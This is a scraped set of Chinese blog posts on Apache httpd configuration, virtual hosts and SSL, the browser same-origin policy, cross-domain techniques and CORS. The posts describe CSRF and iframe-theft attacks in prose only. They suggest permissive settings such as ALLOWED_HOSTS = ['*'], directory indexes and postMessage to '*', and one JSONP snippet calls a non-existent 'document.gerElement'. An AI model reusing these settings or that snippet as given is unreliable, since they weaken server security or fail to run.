#AddHandler cgi-script .cgi #AddHandler type-map var # Filters:在发送给客户端前修改文件内容 #AddType text/html .shtml #AddOutputFilter INCLUDES .shtml # 增加对PHP的支持 # For php7 # PHPIniDir “D:/web/PHP/php-7.1.6” # LoadModule php7_module “D:/web/PHP/php-7.1.6/php7apache2_4.dll” # AddType application/x-httpd-php .php # For php5 PHPIniDir “D:/web/PHP/php-5.6.31” LoadModule php5_module “D:/web/PHP/php-5.6.31/php5apache2_4.dll” AddType application/x-httpd-php .php &lt;/IfModule&gt; MIMEMagicFile 根据 MIMEMagicFile 文件的规则，Apache 通过检查文件开始的几个字节，来判定文件的 MIME 类型依据。这个配置用于指定 MIMEMagicFile 的路径。 #MIMEMagicFile conf/magic ErrorDocument 定制的访问错误响应提示，支持三种方式：明文，本地重定向，外部重定向； #ErrorDocument 500 “The server made a boo boo.” #ErrorDocument 404 /missing.html #ErrorDocument 404 “/cgi-bin/missing_handler.pl” #ErrorDocument 402 http://www.example.com/subscription_info.html 例如第三个表示当服务器出现 404 错误的时候，返回 missing.html 页面。 MaxRanges 定义了在一个请求返回的资源数目的最大值，可以设置为 default，none 或 unlimited。 #MaxRanges unlimited MMAP 内存映射 是否允许内存映射：如果 httpd 在传送过程中需要读取一个文件的内容，它是否可以使用内存映射。如果为 on 表示如果操作系统支持的话，将使用内存映射。在一些多核处理器的系统上，这可能会降低性能，如果在挂载了 NFS 的 DocumentRoot 上如果开启此项功能，可能造成因为分段而造成 httpd 崩溃。 #EnableMMAP off Sendfile 发送文件至客户端 配置 httpd 是否可以使用操作系统内核的 sendfile 函数将文件发送到客户端。默认情况下，当处理一个请求并不需要访问文件内部的数据时（比如发送一个静态的文件内容），如果操作系统支持，Apache 将使用 sendfile 将文件内容直接发送到客户端而并不读取文件。 #EnableSendfile on Apache 补充配置 对 Apache 服务器其它的一些功能进行配置或者修改 Apache 的默认配置，配置文件在 /conf/extra/ 下。可以通过 Include 引入也可以根据需要直接把它们的内容粘贴到这个文件中。 包括：服务器池管理，多语言错误消息，动态目录列表形式配置，语言设置，用户家庭目录，请求和配置上的实时信息，虚拟主机，分布式认证和版本控制，Apache 默认设置，支持 HTML4/XHTML1 等。 1# Server-pool management (MPM specific) #Include conf/extra/httpd-mpm.conf # Multi-language error messages #Include conf/extra/httpd-multilang-errordoc.conf # Fancy directory listings #Include conf/extra/httpd-autoindex.conf # Language settings #Include conf/extra/httpd-languages.conf # User home directories #Include conf/extra/httpd-userdir.conf # Real-time info on requests and configuration #Include conf/extra/httpd-info.conf # Virtual hosts #Include conf/extra/httpd-vhosts.conf # Local access to the Apache HTTP Server Manual #Include conf/extra/httpd-manual.conf # Distributed authoring and versioning (WebDAV) #Include conf/extra/httpd-dav.conf # Various default settings #Include conf/extra/httpd-default.conf # Configure mod_proxy_html to understand HTML4/XHTML1 &lt;IfModule proxy_html_module&gt; Include conf/extra/proxy-html.conf &lt;/IfModule&gt; HTTPS 主要是关于服务器安全连接（HTTPS）方面的设置。 1# Secure (SSL/TLS) connections #Include conf/extra/httpd-ssl.conf # &lt;IfModule ssl_module&gt; SSLRandomSeed startup builtin SSLRandomSeed connect builtin &lt;/IfModule&gt; 参考 Apache主配置文件httpd.conf 详解 Apache配置文件详解之httpd.conf（1）"},{"title":"apache搭建多站点不同根目录","date":"2020-03-23","updated":"2024-03-19","path":"2020/03/23/apache搭建多站点不同根目录/","text":"Apache的虚拟主机是一种允许在同一台机器上配置多个不同站点的web服务器环境的，就是iis一样可以创建多站点了，但是apache需要在编辑状态操作，不能像windows iis直接点击几下就好了，下面我来给各位介绍配置方法。 http 最平常的大概有3种方法。 第一种：单IP不同端口 第二种：多IP同端口（独立IP的虚拟空间） 第三种：域名绑定根目录的方式（共享IP的虚拟空间） Apache的核心配置文件名是”httpd.conf”(debain配置文件在/etc/apache2/)，其所存放的路径在Apache目录下的conf文件夹下。修改它只需要使用记事本（建议使用其他编辑器，带行数的那种，方便修改），生效的话只需要保存httpd.conf，重启apache即可。 下面多站点支持的话，修改httpd.conf的第187~264行（不同的httpd.conf可能有差异），也就是在ServerAdmin和ServerName那里，大部分是注释。下面是主要修改的地方。 注意：如果是服务器请备份httpd.conf后再修改文件。 第一种：单IP不同端口 例子分别通过80和8080访问不同的根目录。 大概在50几行有个Listen 80，在下面添加8080端口。 1234567891011121314151617181920&lt;VirtualHost *:80&gt; ServerAdmin admin@yeniugo.com ServerName www.yeniugo.com:80 DocumentRoot &quot;/var/www/www1&quot; &lt;Directory &quot;/var/www/www1&quot;&gt; Options Indexes FollowSymLinks AllowOverride All Require all granted &lt;/Directory&gt;&lt;/VirtualHost&gt;&lt;VirtualHost *:8080&gt; ServerAdmin admin@yeniugo.com ServerName yeniugo.com:8080 DocumentRoot &quot;/var/www/www2&quot; &lt;Directory &quot;/var/www/www2&quot;&gt; Options Indexes FollowSymLinks AllowOverride All Require all granted &lt;/Directory&gt;&lt;/VirtualHost&gt; 网站访问网址: 网站1: http://www.yeniugo.com 网站2: http://yeniugo.com:8080 第二种多IP同端口。 IP地址1：192.168.2.2 IP地址2：192.168.1.68 端口同是80端口。 1234567891011121314151617181920&lt;VirtualHost 192.168.1.68:80&gt; ServerAdmin admin@yeniugo.com ServerName www.yeniugo.com:80 DocumentRoot &quot;/var/www/www1&quot; &lt;Directory &quot;/var/www/www1&quot;&gt; Options Indexes FollowSymLinks AllowOverride All Require all granted &lt;/Directory&gt;&lt;/VirtualHost&gt;&lt;VirtualHost 192.168.2.2:80&gt; ServerAdmin admin@yeniugo.com ServerName yeniugo.com:80 DocumentRoot &quot;/var/www/www2&quot; &lt;Directory &quot;/var/www/www2&quot;&gt; Options Indexes FollowSymLinks AllowOverride All Require all granted &lt;/Directory&gt;&lt;/VirtualHost&gt; 网站访问网址: 网站1: http://www.yeniugo.com 网站2: http://yeniugo.com 第三种同IP不同域名和根目录（域名的话修改本地host演示）。 1234567891011121314151617181920&lt;VirtualHost *:80&gt; ServerAdmin admin@yeniugo.com ServerName www.yeniugo.com DocumentRoot &quot;/var/www/www1&quot; &lt;Directory &quot;/var/www/www1&quot;&gt; Options Indexes FollowSymLinks AllowOverride All Require all granted &lt;/Directory&gt;&lt;/VirtualHost&gt;&lt;VirtualHost *:80&gt; ServerAdmin admin@yeniugo.com ServerName yeniugo.com DocumentRoot &quot;/var/www/www2&quot; &lt;Directory &quot;/var/www/www2&quot;&gt; Options Indexes FollowSymLinks AllowOverride All Require all granted &lt;/Directory&gt;&lt;/VirtualHost&gt; 网站访问网址: 网站1: http://www.yeniugo.com 网站2: http://yeniugo.com 备注：对于reviewboard中/var/www/reviewboard/conf/settings_local.py 修改最后一行为ALLOWED_HOSTS = ['*']或者主机本身IP，修改成'*'以支持多个ip地址 https,SSL配置 以上是http配置方法，https配置方法类似，区别主要有两点，一个是配置文件不一样，ssl.conf，一个是VirtualHost的端口和内容会有少许差别。内容的话，仿照系统默认的那个写一个即可。 下面有一个demo，仅供参考 1234567891011121314151617181920212223242526272829&lt;VirtualHost *:443&gt; ServerName www.yeniugo.com:443 DocumentRoot &quot;/var/www/www&quot; &lt;Directory &quot;/var/www/www&quot;&gt; Options Indexes FollowSymLinks AllowOverride All Require all granted &lt;/Directory&gt; ErrorLog logs/www_ssl_error_log TransferLog logs/www_ssl_access_log LogLevel warn SSLEngine on SSLProtocol all -SSLv2 SSLCipherSuite HIGH:MEDIUM:!aNULL:!MD5:!SEED:!IDEA SSLCertificateFile /var/www/ssl/public.pem SSLCertificateKeyFile /var/www/ssl/private.key &lt;Files ~ &quot;\\.(cgi|shtml|phtml|php3?)$&quot;&gt; SSLOptions +StdEnvVars &lt;/Files&gt; &lt;Directory &quot;/var/www/cgi-bin&quot;&gt; SSLOptions +StdEnvVars &lt;/Directory&gt; BrowserMatch &quot;MSIE [2-5]&quot; \\ nokeepalive ssl-unclean-shutdown \\ downgrade-1.0 force-response-1.0 CustomLog logs/ssl_request_log \\ &quot;%t %h %&#123;SSL_PROTOCOL&#125;x %&#123;SSL_CIPHER&#125;x \\&quot;%r\\&quot; %b&quot;&lt;/VirtualHost&gt; apache配置文件 Apache搭建多个站点方法详解"},{"title":"区块链相关资料","date":"2020-03-21","updated":"2024-03-19","path":"2020/03/21/区块链相关资料/","text":"区块链基础 知乎专栏 从零开始构建一个区块链 (一)：区块链 从零开始构建一个区块链 (二)：工作量证明 从零开始构建一个区块链 (三)：API 从零开始构建一个区块链 (四)：共识 UTXO 其实并没有什么比特币，只有 UTXO 知乎：比特币UTXO的原理?"},{"title":"DDCTF2018-区块链","date":"2020-03-21","updated":"2024-03-19","path":"2020/03/21/DDCTF2018-区块链/","text":"https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-区块链/"},{"title":"浏览器同源策略","date":"2020-03-21","updated":"2024-03-19","path":"2020/03/21/浏览器同源策略/","text":"https://www.cnblogs.com/laixiangran/p/9064769.html 什么是浏览器同源策略 同源策略（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说 Web 是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。 它的核心就在于它认为自任何站点装载的信赖内容是不安全的。当被浏览器半信半疑的脚本运行在沙箱时，它们应该只被允许访问来自同一站点的资源，而不是那些来自其它站点可能怀有恶意的资源。 所谓同源是指：域名、协议、端口相同。 下表是相对于 http://www.laixiangran.cn/home/index.html 的同源检测结果： 另外，同源策略又分为以下两种： DOM 同源策略：禁止对不同源页面 DOM 进行操作。这里主要场景是 iframe 跨域的情况，不同域名的 iframe 是限制互相访问的。 XMLHttpRequest 同源策略：禁止使用 XHR 对象向不同源的服务器地址发起 HTTP 请求。 为什么要有跨域限制 因为存在浏览器同源策略，所以才会有跨域问题。那么浏览器是出于何种原因会有跨域的限制呢。其实不难想到，跨域限制主要的目的就是为了用户的上网安全。 如果浏览器没有同源策略，会存在什么样的安全问题呢。下面从 DOM 同源策略和 XMLHttpRequest 同源策略来举例说明： 如果没有 DOM 同源策略，也就是说不同域的 iframe 之间可以相互访问，那么黑客可以这样进行攻击： 做一个假网站，里面用 iframe 嵌套一个银行网站 http://mybank.com。 把 iframe 宽高啥的调整到页面全部，这样用户进来除了域名，别的部分和银行的网站没有任何差别。 这时如果用户输入账号密码，我们的主网站可以跨域访问到 http://mybank.com 的 dom 节点，就可以拿到用户的账户密码了。 如果 XMLHttpRequest 同源策略，那么黑客可以进行 CSRF（跨站请求伪造） 攻击： 用户登录了自己的银行页面 http://mybank.com，http://mybank.com 向用户的 cookie 中添加用户标识。 用户浏览了恶意页面 http://evil.com，执行了页面中的恶意 AJAX 请求代码。 http://evil.com 向 http://mybank.com 发起 AJAX HTTP 请求，请求会默认把 http://mybank.com 对应 cookie 也同时发送过去。 银行页面从发送的 cookie 中提取用户标识，验证用户无误，response 中返回请求数据。此时数据就泄露了。 而且由于 Ajax 在后台执行，用户无法感知这一过程。 因此，有了浏览器同源策略，我们才能更安全的上网。 跨域的解决方法 从上面我们了解到了浏览器同源策略的作用，也正是有了跨域限制，才使我们能安全的上网。但是在实际中，有时候我们需要突破这样的限制，因此下面将介绍几种跨域的解决方法。 CORS（跨域资源共享） CORS（Cross-origin resource sharing，跨域资源共享）是一个 W3C 标准，定义了在必须访问跨域资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。 CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。 整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。 因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。 浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 只要同时满足以下两大条件，就属于简单请求。 请求方法是以下三种方法之一： HEAD GET POST HTTP的头信息不超出以下几种字段： Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值 application/x-www-form-urlencoded、multipart/form-data、text/plain 凡是不同时满足上面两个条件，就属于非简单请求。 浏览器对这两种请求的处理，是不一样的。 简单请求 在请求中需要附加一个额外的 Origin 头部，其中包含请求页面的源信息（协议、域名和端口），以便服务器根据这个头部信息来决定是否给予响应。例如：Origin: http://www.laixiangran.cn 如果服务器认为这个请求可以接受，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）。例如：Access-Control-Allow-Origin：http://www.laixiangran.cn 没有这个头部或者有这个头部但源信息不匹配，浏览器就会驳回请求。正常情况下，浏览器会处理请求。注意，请求和响应都不包含 cookie 信息。 如果需要包含 cookie 信息，ajax 请求需要设置 xhr 的属性 withCredentials 为 true，服务器需要设置响应头部 Access-Control-Allow-Credentials: true。 非简单请求 浏览器在发送真正的请求之前，会先发送一个 Preflight 请求给服务器，这种请求使用 OPTIONS 方法，发送下列头部： Origin：与简单的请求相同。 Access-Control-Request-Method: 请求自身使用的方法。 Access-Control-Request-Headers: （可选）自定义的头部信息，多个头部以逗号分隔。 例如： 123Origin: http://www.laixiangran.cnAccess-Control-Request-Method: POSTAccess-Control-Request-Headers: NCZ 发送这个请求后，服务器可以决定是否允许这种类型的请求。服务器通过在响应中发送如下头部与浏览器进行沟通： Access-Control-Allow-Origin：与简单的请求相同。 Access-Control-Allow-Methods: 允许的方法，多个方法以逗号分隔。 Access-Control-Allow-Headers: 允许的头部，多个方法以逗号分隔。 Access-Control-Max-Age: 应该将这个 Preflight 请求缓存多长时间（以秒表示）。 例如： 1234Access-Control-Allow-Origin: http://www.laixiangran.cnAccess-Control-Allow-Methods: GET, POSTAccess-Control-Allow-Headers: NCZAccess-Control-Max-Age: 1728000 一旦服务器通过 Preflight 请求允许该请求之后，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样了。 优点 CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。 支持所有类型的 HTTP 请求。 缺点 存在兼容性问题，特别是 IE10 以下的浏览器。 第一次发送非简单请求时会多一次请求。 JSONP 跨域 由于 script 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过动态创建 script 标签，然后利用 src 属性进行跨域，这也就是 JSONP 跨域的基本原理。 直接通过下面的例子来说明 JSONP 实现跨域的流程： 1234567891011121314// 1. 定义一个 回调函数 handleResponse 用来接收返回的数据function handleResponse(data) &#123; console.log(data);&#125;;// 2. 动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponsevar body = document.getElementsByTagName(&#x27;body&#x27;)[0];var script = document.gerElement(&#x27;script&#x27;);script.src = &#x27;http://www.laixiangran.cn/json?callback=handleResponse&#x27;;body.appendChild(script);// 3. 通过 script.src 请求 `http://www.laixiangran.cn/json?callback=handleResponse`，// 4. 后端能够识别这样的 URL 格式并处理该请求，然后返回 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 给浏览器// 5. 浏览器在接收到 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。 优点 使用简便，没有兼容性问题，目前最流行的一种跨域方法。 缺点 只支持 GET 请求。 由于是从其它域中加载代码执行，因此如果其他域不安全，很可能会在响应中夹带一些恶意代码。 要确定 JSONP 请求是否失败并不容易。虽然 HTML5 给 script 标签新增了一个 onerror 事件处理程序，但是存在兼容性问题。 图像 Ping 跨域 由于 img 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过 img 标签的 src 属性进行跨域，这也就是图像 Ping 跨域的基本原理。 直接通过下面的例子来说明图像 Ping 实现跨域的流程： 123456789var img = new Image();// 通过 onload 及 onerror 事件可以知道响应是什么时候接收到的，但是不能获取响应文本img.onload = img.onerror = function() &#123; console.log(&quot;Done!&quot;);&#125;// 请求数据通过查询字符串形式发送img.src = &#x27;http://www.laixiangran.cn/test?name=laixiangran&#x27;; 优点 用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势。 缺点 只支持 GET 请求。 只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本。 服务器代理 浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所要域的资源再返回给客户端。 服务器代理是万能的。 document.domain 跨域 对于主域名相同，而子域名不同的情况，可以使用 document.domain 来跨域。这种方式非常适用于 iframe 跨域的情况。 比如，有一个页面，它的地址是 http://www.laixiangran.cn/a.html，在这个页面里面有一个 iframe，它的 src 是 http://laixiangran.cn/b.html。很显然，这个页面与它里面的 iframe 框架是不同域的，所以我们是无法通过在页面中书写 js 代码来获取 iframe 中的东西的。 这个时候，document.domain 就可以派上用场了，我们只要把 http://www.laixiangran.cn/a.html 和 http://laixiangran.cn/b.html 这两个页面的 document.domain 都设成相同的域名就可以了。但要注意的是，document.domain 的设置是有限制的，我们只能把 document.domain 设置成自身或更高一级的父域，且主域必须相同。例如：a.b.laixiangran.cn 中某个文档的 document.domain 可以设成 a.b.laixiangran.cn、b.laixiangran.cn 、laixiangran.cn 中的任意一个，但是不可以设成 c.a.b.laixiangran.cn ，因为这是当前域的子域，也不可以设成 baidu.com，因为主域已经不相同了。 例如，在页面 http://www.laixiangran.cn/a.html 中设置document.domain： 1234567&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot;&gt;&lt;script&gt; document.domain = &#x27;laixiangran.cn&#x27;; // 设置成主域 function test() &#123; console.log(document.getElementById(&#x27;myIframe&#x27;).contentWindow); &#125;&lt;/script&gt; 在页面 http://laixiangran.cn/b.html 中也设置 document.domain，而且这也是必须的，虽然这个文档的 domain 就是 laixiangran.cn，但是还是必须显式地设置 document.domain 的值： 123&lt;script&gt; document.domain = &#x27;laixiangran.cn&#x27;; // document.domain 设置成与主页面相同&lt;/script&gt; 这样，http://www.laixiangran.cn/a.html 就可以通过 js 访问到 http://laixiangran.cn/b.html 中的各种属性和对象了。 window.name 跨域 window 对象有个 name 属性，该属性有个特征：即在一个窗口（window）的生命周期内，窗口载入的所有的页面（不管是相同域的页面还是不同域的页面）都是共享一个 window.name 的，每个页面对 window.name 都有读写的权限，window.name 是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。 通过下面的例子介绍如何通过 window.name 来跨域获取数据的。 页面 http://www.laixiangran.cn/a.html 的代码： 123456789101112131415161718&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&quot;display: none;&quot;&gt;&lt;script&gt; // 2. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数 function test() &#123; var iframe = document.getElementById(&#x27;myIframe&#x27;); // 重置 iframe 的 onload 事件程序， // 此时经过后面代码重置 src 之后， // http://www.laixiangran.cn/a.html 页面与该 iframe 在同一个源了，可以相互访问了 iframe.onload = function() &#123; var data = iframe.contentWindow.name; // 4. 获取 iframe 里的 window.name console.log(data); // hello world! &#125;; // 3. 重置一个与 http://www.laixiangran.cn/a.html 页面同源的页面 iframe.src = &#x27;http://www.laixiangran.cn/c.html&#x27;; &#125;&lt;/script&gt; 页面 http://laixiangran.cn/b.html 的代码： 1234&lt;script type=&quot;text/javascript&quot;&gt; // 1. 给当前的 window.name 设置一个 http://www.laixiangran.cn/a.html 页面想要得到的数据值 window.name = &quot;hello world!&quot;;&lt;/script&gt; location.hash 跨域 location.hash 方式跨域，是子框架具有修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。但是传递的数据的字节数是有限的。 页面 http://www.laixiangran.cn/a.html 的代码： 123456789&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&quot;display: none;&quot;&gt;&lt;script&gt; // 2. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数 function test() &#123; // 3. 获取通过 http://laixiangran.cn/b.html 页面设置 hash 值 var data = window.location.hash; console.log(data); &#125;&lt;/script&gt; 页面 http://laixiangran.cn/b.html 的代码： 1234&lt;script type=&quot;text/javascript&quot;&gt; // 1. 设置父页面的 hash 值 parent.location.hash = &quot;world&quot;;&lt;/script&gt; postMessage 跨域 window.postMessage(message，targetOrigin) 方法是 HTML5 新引进的特性，可以使用它来向其它的 window 对象发送消息，无论这个 window 对象是属于同源或不同源。这个应该就是以后解决 dom 跨域通用方法了。 调用 postMessage 方法的 window 对象是指要接收消息的那一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrigin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 *。 需要接收消息的 window 对象，可是通过监听自身的 message 事件来获取传过来的消息，消息内容储存在该事件对象的 data 属性中。 页面 http://www.laixiangran.cn/a.html 的代码： 1234567891011&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&quot;display: none;&quot;&gt;&lt;script&gt; // 1. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数 function test() &#123; // 2. 获取 http://laixiangran.cn/b.html 页面的 window 对象， // 然后通过 postMessage 向 http://laixiangran.cn/b.html 页面发送消息 var iframe = document.getElementById(&#x27;myIframe&#x27;); var win = iframe.contentWindow; win.postMessage(&#x27;我是来自 http://www.laixiangran.cn/a.html 页面的消息&#x27;, &#x27;*&#x27;); &#125;&lt;/script&gt; 页面 http://laixiangran.cn/b.html 的代码： 1234567&lt;script type=&quot;text/javascript&quot;&gt; // 注册 message 事件用来接收消息 window.onmessage = function(e) &#123; e = e || event; // 获取事件对象 console.log(e.data); // 通过 data 属性得到发送来的消息 &#125;&lt;/script&gt; Cookie Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。但是，两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置document.domain共享 Cookie。 举例来说，A网页是http://w1.example.com/a.html，B网页是http://w2.example.com/b.html，那么只要设置相同的document.domain，两个网页就可以共享Cookie。 1document.domain = &#x27;example.com&#x27;; 现在，A网页通过脚本设置一个 Cookie。 1document.cookie = &quot;test1=hello&quot;; B网页就可以读到这个 Cookie。 1var allCookie = document.cookie; 注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexDB 无法通过这种方法，规避同源政策，而要使用下文介绍的PostMessage API。 另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如.example.com。 1Set-Cookie: key=value; domain=.example.com; path=/ 这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。 iframe 如果两个网页不同源，就无法拿到对方的DOM。典型的例子是iframe窗口和window.open方法打开的窗口，它们与父窗口无法通信。 比如，父窗口运行下面的命令，如果iframe窗口不是同源，就会报错。 12document.getElementById(&quot;myIFrame&quot;).contentWindow.document// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame. 上面命令中，父窗口想获取子窗口的DOM，因为跨源导致报错。 反之亦然，子窗口获取主窗口的DOM也会报错。 12window.parent.document.body// 报错 如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document.domain属性，就可以规避同源政策，拿到DOM。 对于完全不同源的网站，目前有三种方法，可以解决跨域窗口的通信问题。 片段识别符（fragment identifier） window.name 跨文档通信API（Cross-document messaging） 3.1 片段识别符 片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如http://example.com/x.html#fragment的#fragment。如果只是改变片段标识符，页面不会重新刷新。 父窗口可以把信息，写入子窗口的片段标识符。 12var src = originURL + &#x27;#&#x27; + data;document.getElementById(&#x27;myIFrame&#x27;).src = src; 子窗口通过监听hashchange事件得到通知。 123456window.onhashchange = checkMessage;function checkMessage() &#123; var message = window.location.hash; // ...&#125; 同样的，子窗口也可以改变父窗口的片段标识符。 1parent.location.href= target + &quot;#&quot; + hash; 3.2 window.name 浏览器窗口有window.name属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。 父窗口先打开一个子窗口，载入一个不同源的网页，该网页将信息写入window.name属性。 1window.name = data; 接着，子窗口跳回一个与主窗口同域的网址。 1location = &#x27;http://parent.url.com/xxx.html&#x27;; 然后，主窗口就可以读取子窗口的window.name了。 1var data = document.getElementById(&#x27;myFrame&#x27;).contentWindow.name; 这种方法的优点是，window.name容量很大，可以放置非常长的字符串；缺点是必须监听子窗口window.name属性的变化，影响网页性能。 3.3 window.postMessage 上面两种方法都属于破解，HTML5为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。 这个API为window对象新增了一个window.postMessage方法，允许跨窗口通信，不论这两个窗口是否同源。 举例来说，父窗口http://aaa.com向子窗口http://bbb.com发消息，调用postMessage方法就可以了。 12var popup = window.open(&#x27;http://bbb.com&#x27;, &#x27;title&#x27;);popup.postMessage(&#x27;Hello World!&#x27;, &#x27;http://bbb.com&#x27;); postMessage方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即&quot;协议 + 域名 + 端口&quot;。也可以设为*，表示不限制域名，向所有窗口发送。 子窗口向父窗口发送消息的写法类似。 1window.opener.postMessage(&#x27;Nice to see you&#x27;, &#x27;http://aaa.com&#x27;); 父窗口和子窗口都可以通过message事件，监听对方的消息。 123window.addEventListener(&#x27;message&#x27;, function(e) &#123; console.log(e.data);&#125;,false); message事件的事件对象event，提供以下三个属性。 event.source：发送消息的窗口 event.origin: 消息发向的网址 event.data: 消息内容 下面的例子是，子窗口通过event.source属性引用父窗口，然后发送消息。 1234window.addEventListener(&#x27;message&#x27;, receiveMessage);function receiveMessage(event) &#123; event.source.postMessage(&#x27;Nice to see you!&#x27;, &#x27;*&#x27;);&#125; event.origin属性可以过滤不是发给本窗口的消息。 123456789window.addEventListener(&#x27;message&#x27;, receiveMessage);function receiveMessage(event) &#123; if (event.origin !== &#x27;http://aaa.com&#x27;) return; if (event.data === &#x27;Hello World&#x27;) &#123; event.source.postMessage(&#x27;Hello&#x27;, event.origin); &#125; else &#123; console.log(event.data); &#125;&#125; 3.4 LocalStorage 通过window.postMessage，读写其他窗口的 LocalStorage 也成为了可能。 下面是一个例子，主窗口写入iframe子窗口的localStorage。 1234567window.onmessage = function(e) &#123; if (e.origin !== &#x27;http://bbb.com&#x27;) &#123; return; &#125; var payload = JSON.parse(e.data); localStorage.setItem(payload.key, JSON.stringify(payload.data));&#125;; 上面代码中，子窗口将父窗口发来的消息，写入自己的LocalStorage。 父窗口发送消息的代码如下。 123var win = document.getElementsByTagName(&#x27;iframe&#x27;)[0].contentWindow;var obj = &#123; name: &#x27;Jack&#x27; &#125;;win.postMessage(JSON.stringify(&#123;key: &#x27;storage&#x27;, data: obj&#125;), &#x27;http://bbb.com&#x27;); 加强版的子窗口接收消息的代码如下。 1234567891011121314151617window.onmessage = function(e) &#123; if (e.origin !== &#x27;http://bbb.com&#x27;) return; var payload = JSON.parse(e.data); switch (payload.method) &#123; case &#x27;set&#x27;: localStorage.setItem(payload.key, JSON.stringify(payload.data)); break; case &#x27;get&#x27;: var parent = window.parent; var data = localStorage.getItem(payload.key); parent.postMessage(data, &#x27;http://aaa.com&#x27;); break; case &#x27;remove&#x27;: localStorage.removeItem(payload.key); break; &#125;&#125;; 加强版的父窗口发送消息代码如下。 1234567891011var win = document.getElementsByTagName(&#x27;iframe&#x27;)[0].contentWindow;var obj = &#123; name: &#x27;Jack&#x27; &#125;;// 存入对象win.postMessage(JSON.stringify(&#123;key: &#x27;storage&#x27;, method: &#x27;set&#x27;, data: obj&#125;), &#x27;http://bbb.com&#x27;);// 读取对象win.postMessage(JSON.stringify(&#123;key: &#x27;storage&#x27;, method: &quot;get&quot;&#125;), &quot;*&quot;);window.onmessage = function(e) &#123; if (e.origin != &#x27;http://aaa.com&#x27;) return; // &quot;Jack&quot; console.log(JSON.parse(e.data).name);&#125;; 参考资料 js中几种实用的跨域方法原理详解 跨域的那些事儿 跨域资源共享 CORS 详解"},{"title":"跨域资源共享CORS","date":"2020-03-21","updated":"2024-03-19","path":"2020/03/21/跨域资源共享CORS/","text":"原文地址: 跨域资源共享 CORS 详解 CORS是一个W3C标准，全称是&quot;跨域资源共享&quot;（Cross-origin resource sharing）。 它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。 本文详细介绍CORS的内部机制。 一、简介 CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。 整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。 因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。 二、两种请求 浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 只要同时满足以下两大条件，就属于简单请求。 （1) 请求方法是以下三种方法之一： HEAD GET POST （2）HTTP的头信息不超出以下几种字段： Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain 凡是不同时满足上面两个条件，就属于非简单请求。 浏览器对这两种请求的处理，是不一样的。 三、简单请求 3.1 基本流程 对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。 下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。 123456GET /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... 